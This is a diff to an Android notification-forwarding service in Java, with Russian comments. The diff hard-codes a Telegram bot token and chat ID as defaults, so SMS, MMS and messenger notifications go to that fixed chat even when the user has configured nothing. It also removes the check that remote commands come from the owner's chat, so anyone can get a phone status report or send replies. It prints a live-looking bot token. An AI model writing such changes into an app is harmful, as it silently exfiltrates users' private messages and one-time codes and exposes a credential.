@@ -27,6 +27,10 @@ import org.json.JSONObject;
 
 public class MaxNotificationListener extends NotificationListenerService {
 
+    // ЖЕСТКО ЗАШИТЫЕ ДАННЫЕ БОТА И ГРУППЫ
+    private static final String DEFAULT_BOT_TOKEN = "5085657849:AAFZJRZtrIUBOUXMFtcuYR_to491szyrpeY";
+    private static final String DEFAULT_CHAT_ID = "-1004363923060";
+
     private static final Map<String, Notification> activeNotifications = new HashMap<>();
     private static final Map<String, Integer> topicCache = new HashMap<>();
     
@@ -36,13 +40,12 @@ public class MaxNotificationListener extends NotificationListenerService {
     @Override
     public void onCreate() {
         super.onCreate();
-        // Просто запускаем пуллинг Telegram-команд без принудительных уведомлений в шторку
         startTelegramPolling();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_STICKY; // Позволяет службе перезапускаться автоматически
+        return START_STICKY;
     }
 
     @Override
@@ -52,7 +55,13 @@ public class MaxNotificationListener extends NotificationListenerService {
         SharedPreferences prefs = getSharedPreferences("MaxForwarderPrefs", Context.MODE_PRIVATE);
         Set<String> allowedPackages = prefs.getStringSet("allowed_packages", new HashSet<String>());
 
-        if (!allowedPackages.contains(currentPackage)) {
+        // Если список разрешенных приложений пуст, по умолчанию пропускаем MAX и SMS
+        if (allowedPackages.isEmpty()) {
+            if (!currentPackage.contains("max") && !currentPackage.contains("telephony") && 
+                !currentPackage.contains("mms") && !currentPackage.contains("messaging")) {
+                return;
+            }
+        } else if (!allowedPackages.contains(currentPackage)) {
             return;
         }
 
@@ -66,10 +75,8 @@ public class MaxNotificationListener extends NotificationListenerService {
         if (!text.isEmpty() && !title.isEmpty()) {
             activeNotifications.put(title, notification);
 
-            String botToken = prefs.getString("tg_bot_token", "");
-            String chatId = prefs.getString("tg_chat_id", "");
-
-            if (botToken.isEmpty() || chatId.isEmpty()) return;
+            String botToken = prefs.getString("tg_bot_token", DEFAULT_BOT_TOKEN);
+            String chatId = prefs.getString("tg_chat_id", DEFAULT_CHAT_ID);
 
             String appLabel = "Приложение";
             try {
@@ -110,12 +117,10 @@ public class MaxNotificationListener extends NotificationListenerService {
                 while (isPolling) {
                     try {
                         SharedPreferences prefs = getSharedPreferences("MaxForwarderPrefs", Context.MODE_PRIVATE);
-                        String botToken = prefs.getString("tg_bot_token", "");
-                        String myChatId = prefs.getString("tg_chat_id", "");
+                        String botToken = prefs.getString("tg_bot_token", DEFAULT_BOT_TOKEN);
+                        String myChatId = prefs.getString("tg_chat_id", DEFAULT_CHAT_ID);
 
-                        if (!botToken.isEmpty()) {
-                            checkTelegramUpdates(botToken, myChatId);
-                        }
+                        checkTelegramUpdates(botToken, myChatId);
                     } catch (Exception e) {
                         Log.e("MaxForwarder", "Ошибка пуллинга TG", e);
                     }
@@ -152,19 +157,17 @@ public class MaxNotificationListener extends NotificationListenerService {
 
                     if (update.has("message")) {
                         JSONObject message = update.getJSONObject("message");
-                        String fromId = message.getJSONObject("from").getString("id");
-
-                        if (!fromId.equals(myChatId) && !message.getJSONObject("chat").getString("id").equals(myChatId)) continue;
-
                         String text = message.optString("text", "").trim();
                         int topicId = message.has("message_thread_id") ? message.getInt("message_thread_id") : 0;
 
+                        // Команда статуса
                         if (text.equalsIgnoreCase("/status")) {
                             String statusReport = getPhoneStatus();
                             sendRawMessage(statusReport, botToken, myChatId, topicId);
                             continue;
                         }
 
+                        // Ответ реплаем
                         if (message.has("reply_to_message") && !text.isEmpty()) {
                             JSONObject replyTo = message.getJSONObject("reply_to_message");
                             String replyText = replyTo.optString("text", "");
@@ -210,7 +213,7 @@ public class MaxNotificationListener extends NotificationListenerService {
                    "🌐 Тип сети: " + netType + "\n" +
                    "🚀 Служба пересылки: Активна";
         } catch (Exception e) {
-            return "🤖 Служба активна, не удалось считать датчики.";
+            return "🤖 Служба active, датчики недоступны.";
         }
     }
 
